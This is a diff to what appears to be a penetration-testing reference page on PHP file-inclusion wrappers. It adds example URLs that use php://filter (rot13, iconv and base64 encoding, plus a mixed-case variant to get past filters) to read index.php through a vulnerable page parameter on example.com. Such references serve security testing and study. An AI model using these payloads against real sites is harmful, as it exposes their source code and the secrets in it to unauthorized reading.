@@ -5,8 +5,16 @@ A wrapper in the context of file inclusion vulnerabilities refers to the protoco
 ## Wrapper php://filter
 The part ```"php://filter"``` is case insensitive
 
-| Filter	                                                            |                  Description                  |
+| Filter	                                                            |                  Description                 |
 | -----------------------------------------------------------------   | ---------------------------------------------|
 | ```php://filter/read=string.rot13/resource=index.php```	            | Display index.php as rot13                   |
 | ``` php://filter/convert.iconv.utf-8.utf-16/resource=index.php```   | Encode index.php from utf8 to utf16          |
 | ``` php://filter/convert.base64-encode/resource=index.php```	      | Display index.php as a base64 encoded string | 
+
+
+```php
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+```
